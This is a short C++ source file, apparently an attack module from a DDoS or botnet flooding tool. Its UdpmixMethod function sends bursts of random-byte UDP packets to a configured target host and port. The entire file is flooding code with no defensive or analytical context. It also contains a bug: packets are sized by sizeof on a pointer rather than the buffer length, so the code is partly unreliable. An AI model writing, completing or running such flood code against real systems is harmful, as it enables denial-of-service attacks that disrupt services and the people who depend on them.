#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

#include <cstdio>

#include "../headers/config.hpp"
#include "../headers/include.hpp"
#include "../headers/utils.hpp"

void UdpmixMethod(types) {
  int fd;
  sockaddr_in sa;

  if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
    return;
  };

  sa.sin_family = AF_INET;
  sa.sin_port = htons(port);
  sa.sin_addr.s_addr = inet_addr(target.c_str());

  int bufsize = RandomInt(FLOOD_BUF_SIZE);
  char* buf = new char[bufsize];
  RandomBuf(buf, bufsize);

  for (int i = 0; i <= 30; i++) {
    sendto(fd, buf, sizeof(buf), MSG_NOSIGNAL, (struct sockaddr*)&sa, sizeof(sa));
  }

  delete[] buf;
  buf = nullptr;
  close(fd);
}